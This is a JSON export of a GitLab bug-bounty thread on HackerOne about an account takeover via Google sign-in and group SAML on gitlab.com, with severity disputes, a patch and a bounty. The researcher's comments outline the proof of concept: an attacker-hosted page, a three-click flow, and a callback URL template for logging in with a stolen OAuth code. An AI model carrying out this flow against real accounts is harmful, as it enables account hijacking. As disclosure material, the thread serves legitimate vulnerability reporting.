          "filename": "Screenshot_2023-04-07_at_19.40.53.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/i7rmiwvbnsv97nmefutfmger9g6i?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-04-07_at_19.40.53.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-04-07_at_19.40.53.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065504Z&X-Amz-Expires=3276&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=175fca7794b351d379304c81f5fa477fcf2a1636371b3d95850d6b6267ab5b40"
        },
        {
          "id": 2279518,
          "filename": "Screenshot_2023-04-07_at_19.35.23.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1if8hqkhpdrasot6e73v6bjfx44o?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-04-07_at_19.35.23.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-04-07_at_19.35.23.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065504Z&X-Amz-Expires=3276&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=aa28fcab1b6eaced690b303e88fe0c9f59bb86698cd5e87ae35e854ee1bcdb00"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21183980,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @ameya_gitlab ,\n\n\nLet me clear this up.\n\n* https://witcoat.com/gitlab_o534fd753g/bdfey363f9q/sso.php?RelayState= isnt a POC url, i was trying to tell you what changes i made in the poc.\nyou saw the authorise prompt, because you were already logged into your account. \n\n\n* \n\n> And using your PoC at https://witcoat.com/gitlab_o534fd753g/bdfey363f9q/zlo.html, I am logged in into a completely random account called \"@skinnysaml\". Please check this behaviour:\n\nDont worry about where you are logged in. Isnt this what SAML suppose to do? , thats my account, but lets just know our aim is to \"save\" the open redirect for the victim.\n\n\n\n## without confusing this any further, let me rewrite the POC: [ACCOUNT TAKEOVER]\n\n\nmake sure you are logged into gitlab and google, which are linked together.\n\n\n* open: https://witcoat.com/gitlab_o534fd753g/bdfey363f9q/zlo.html\n\n{F2280821}\n\n\n* Click 1\n* Click 2\n* Click 3\n\n\n\nIf you are not logged into gitlab you could skip click 1 (which is what i was doing in the video, and might be confusing you), but lets just keep it simple `1 -> 2 -> 3`\n\n\nfollow video to try logging into gitlab with stolen code: \n\n\n{F2275109}\n\n\n\nhere is the url im using, collect the right state and login with stolen code\n\n\n`https://gitlab.com/users/auth/google_oauth2/callback?state=........your login state.......&code=...... stolen code .......`\n\n\n",
      "automated_response": false,
      "created_at": "2023-04-08T07:08:47.702Z",
      "updated_at": "2023-04-08T07:22:04.523Z",
      "actor": {
        "username": "bull",
        "cleared": true,
        "verified": true,
        "url": "/bull",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/102/224/c7a38e937595fb38aba8f664ca35626c15243a0d_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 2280821,
          "filename": "Screenshot_2023-04-08_at_12.29.44_PM.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yl9lx0dppwzfkcnrasfxr901qmdv?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-04-08_at_12.29.44_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-04-08_at_12.29.44_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065504Z&X-Amz-Expires=3276&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=00306df98fd24c3e01a555966f1ac62e48ebc9c45c2b9ab8a7726cecd48f39c2"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21198828,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2023-04-10T06:34:26.563Z",
      "updated_at": "2023-04-10T06:34:26.563Z",
      "additional_data": {
        "old_severity": "Medium (5.8)",
        "new_severity": "Medium (4.3)",
        "old_severity_id": 1929283,
        "new_severity_id": 1943368
      },
      "actor": {
        "username": "ameya_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/ameya_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ollldnbeou8kry1g922mk4altzqz/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21198840,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Hello,\n\nThank you for submitting this report.\n\nWe are escalating this to our engineering team for further investigation.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/406235.  Although medium and high severity issues are typically awarded a partial bounty when triaged, at this time we will delay until the report is validated by the team. \n\nWe will continue to update you via HackerOne as the discussion continues, and if/when a patch is scheduled for release. GitLab issues for valid reports are made public 30 days following the release of a patch.\n\nBest regards,\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2023-04-10T06:36:01.387Z",
      "updated_at": "2023-04-10T06:36:01.387Z",
      "actor": {
        "username": "ameya_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/ameya_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ollldnbeou8kry1g922mk4altzqz/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21198865,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@bull,\n\nPlease keep the PoC for this bug live until we reward you and fix this issue.\n\nThanks,\n@ameya_gitlab ",
      "automated_response": false,
      "created_at": "2023-04-10T06:37:57.514Z",
      "updated_at": "2023-04-10T06:37:57.514Z",
      "actor": {
        "username": "ameya_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/ameya_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ollldnbeou8kry1g922mk4altzqz/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21215284,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "ETA for fix:\n\nHi @bull,\n\nThe issue you reported is currently scheduled to be fixed by 2023-05-31.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n",
      "automated_response": true,
      "created_at": "2023-04-11T04:01:32.024Z",
      "updated_at": "2023-04-11T04:01:32.024Z",
      "actor": {
        "username": "gitlab-securitybot",
        "cleared": false,
        "verified": false,
        "url": "/gitlab-securitybot",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21237987,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @gitlab \n\nCould you please change the report title to `Account takeover using sign in with google` ?\nAlso could you reevaluate the severity here, i don't believe believe one click account takeover is a `medium`?\n",
      "automated_response": false,
      "created_at": "2023-04-12T06:33:49.247Z",
      "updated_at": "2023-04-12T06:33:49.247Z",
      "actor": {
        "username": "bull",
        "cleared": true,
        "verified": true,
        "url": "/bull",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/102/224/c7a38e937595fb38aba8f664ca35626c15243a0d_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21427151,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2023-04-19T06:59:28.429Z",
      "updated_at": "2023-04-19T06:59:28.429Z",
      "additional_data": {
        "old_severity": "Medium (4.3)",
        "new_severity": "Medium (5.4)",
        "old_severity_id": 1943368,
        "new_severity_id": 1959963
      },
      "actor": {
        "username": "ameya_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/ameya_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ollldnbeou8kry1g922mk4altzqz/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21664499,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "{F2329425}\n\n\nHi there,\n\n\nthis issue has absoluting been misunderstood by you? \n\nwhy isnt anyone discussing this with me?\n\n>This feature isn't enabled by default.\n\nThe feature had to been enabled in attacker's account and not of victim's\n\nthis will work for anyone using `signin with google` regarding of them using `SAML` or not\n\n\n\n\nand its defiantly not a `medium`?????\n\n\nInfact https://gitlab.com/gitlab-org/gitlab/-/issues/377810 this was an account takeover as well,\n\njust had to change `response_type` from `token` to `id_token,code` in the above report, so they could steal code and use it to login into victim's account\n\nPlease ask me for any clarification? ",
      "automated_response": false,
      "created_at": "2023-05-03T11:06:58.412Z",
      "updated_at": "2023-05-03T11:06:58.412Z",
      "actor": {
        "username": "bull",
        "cleared": true,
        "verified": true,
        "url": "/bull",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/102/224/c7a38e937595fb38aba8f664ca35626c15243a0d_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 2329425,
          "filename": "Screenshot_2023-05-03_at_4.30.35_PM.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/15lpyjmuj5i445tfdduv3x4n3ncn?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-05-03_at_4.30.35_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-05-03_at_4.30.35_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065504Z&X-Amz-Expires=3276&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c9e82fe9f58d55ed9415785f2d2ec9a26bc5772a8c4dacc2bd6e7c7f516d1f49"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21888685,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2023-05-17T11:08:24.175Z",
      "updated_at": "2023-05-17T11:08:24.175Z",
      "additional_data": {
        "old_severity": "Medium (5.4)",
        "new_severity": "Medium (6.8)",
        "old_severity_id": 1959963,
        "new_severity_id": 2003226
      },
      "actor": {
        "username": "ameya_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/ameya_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ollldnbeou8kry1g922mk4altzqz/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21888708,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Hi,\n\nThank you again for the report! Your finding has been patched in GitLab version 15.11.1. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker. If you'd like to publicly disclose this report or details of it in a blog post or elsewhere, please allow 30 days to pass before doing so to give time to our customers to upgrade to a patched version.\n\nWe look forward to your next report!\n\nBest regards,\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2023-05-17T11:10:12.488Z",
      "updated_at": "2023-05-17T11:10:12.488Z",
      "actor": {
        "username": "ameya_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/ameya_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ollldnbeou8kry1g922mk4altzqz/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "bull",
        "url": "/bull"
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21888709,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "",
      "automated_response": false,
      "created_at": "2023-05-17T11:10:26.444Z",
      "updated_at": "2023-05-17T11:10:26.444Z",
      "actor": {
        "url": "/gitlab",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "GitLab"
        }
      },
      "bounty_amount": "2450.0",
      "bonus_amount": "0.0",
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "gitlab",
      "collaborator": {
        "username": "bull",
        "url": "/bull"
      }
    },
    {
      "id": 21888886,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @ameya_gitlab \n\n\nAny explanation on severity and bounty reward,\n\n\nI disagree on the reward and severity since this is an account takeover.\n\nThis is very unproffesional of you.",
      "automated_response": false,
      "created_at": "2023-05-17T11:29:08.075Z",
      "updated_at": "2023-05-17T11:29:08.075Z",
      "actor": {
        "username": "bull",
        "cleared": true,
        "verified": true,
        "url": "/bull",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/102/224/c7a38e937595fb38aba8f664ca35626c15243a0d_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21888895,
      "is_internal": false,
      "editable": false,
      "type": "Activities::HackerRequestedMediation",
      "message": "",
      "automated_response": false,
      "created_at": "2023-05-17T11:30:21.196Z",
      "updated_at": "2023-05-17T11:30:21.196Z",
      "actor": {
        "username": "bull",
        "cleared": true,
        "verified": true,
        "url": "/bull",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/102/224/c7a38e937595fb38aba8f664ca35626c15243a0d_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21888945,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Internal discussions have led to the following conclusion:\n\nThis vulnerability only impacts GitLab.com, but not self-managed GitLab due to the difference in how SAML works between .com and self-managed. SAML SSO for .com is enabled by default and it can be configured at the group-level, while SAML SSO for self-managed is instance-level only and disabled by default. In other words, the attack only works if a group has Group SAML SSO set up which is not default and not something that the attacker can enable or configure. The PoC is not applicable for a self-managed instance because Group SAML SSO cannot be set up for GitLab self-managed. Given that this attack is only possible for .com, we have assigned a CVSS score of 6.8.\n\nThanks,\n@ameya_gitlab ",
      "automated_response": false,
      "created_at": "2023-05-17T11:34:41.371Z",
      "updated_at": "2023-05-17T11:34:41.371Z",
      "actor": {
        "username": "ameya_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/ameya_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ollldnbeou8kry1g922mk4altzqz/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21889152,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @ameya_gitlab ,\n\n\nThank you for the response.\n\n\n`This vulnerability only impacts GitLab.com,`\n\nAs you said, this impacts only gitlab.com , and for the sake of discussion could you please first of all agree on, this is \n`Account Takeover using sign-in with google on gitlab.com?`\n\nAnd if so, could you please change the tittle for me? \n\nlets keep self-instance to the side, not just SAML has to be setup there, but also signin with google. not have you once agreed on this while the whole triage process.\n\n\n\nAnd i Still disagree on your decision :\n\nAccording to me, Account takeover on gitlab.com using sign with google is a `High` \n\n\nHave you investigated the number of user base using signin with google? Anyways keeping self instance aside, gitlab.com is a major target.\n\n\n**Could you explain how, account takeover of gitlab.com is not a `high`?** (please exclude self instance all at once)\n\n\n\n\n\n\n\n",
      "automated_response": false,
      "created_at": "2023-05-17T11:55:43.782Z",
      "updated_at": "2023-05-17T11:55:43.782Z",
      "actor": {
        "username": "bull",
        "cleared": true,
        "verified": true,
        "url": "/bull",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/102/224/c7a38e937595fb38aba8f664ca35626c15243a0d_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21889164,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "requesting full disclosure!",
      "automated_response": false,
      "created_at": "2023-05-17T11:56:26.931Z",
      "updated_at": "2023-05-17T11:56:26.931Z",
      "first_to_agree": true,
      "actor": {
        "username": "bull",
        "cleared": true,
        "verified": true,
        "url": "/bull",
        "profile_picture_urls": {
